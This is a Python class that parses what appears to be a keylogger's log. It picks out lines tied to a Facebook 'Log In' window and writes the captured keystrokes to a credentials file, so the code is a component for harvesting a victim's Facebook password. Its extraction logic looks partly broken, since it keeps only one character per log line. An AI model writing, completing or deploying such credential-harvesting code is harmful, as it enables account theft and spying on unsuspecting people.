class Analyzer:
    def __init__(self, log_file, cred_file):
        # arguments
        self.log_file = log_file
        self.cred_file = open(cred_file, 'a')
        
        # other properties
        self.will_not_parse = False
        self.got_fb_creds = False
        self.fb_creds = ''
    
    def parse_log_file(self):
        self.will_not_parse = self.got_fb_creds # AND *_cred vars
        if self.will_not_parse:
            self.cred_file.close()
            return self.will_not_parse
        else:
            if(not self.got_fb_creds):
                fd = open(self.log_file, 'r')
                for msg in fd:
                    if(('Facebook' in msg) and ('Log In' in msg)):
                        if('Key'not in msg):
                            self.fb_creds += msg[1]
                    elif(('Facebook' in msg) and ('Log In' not in msg)):
                        # add to cred file
                        self.cred_file.write('Facebook: %s\n' % self.fb_creds)
                        self.got_fb_creds= True
                    else:
                        continue
                fd.close()
        self.will_not_parse = self.got_fb_creds # AND *_cred vars
        return self.will_not_parse
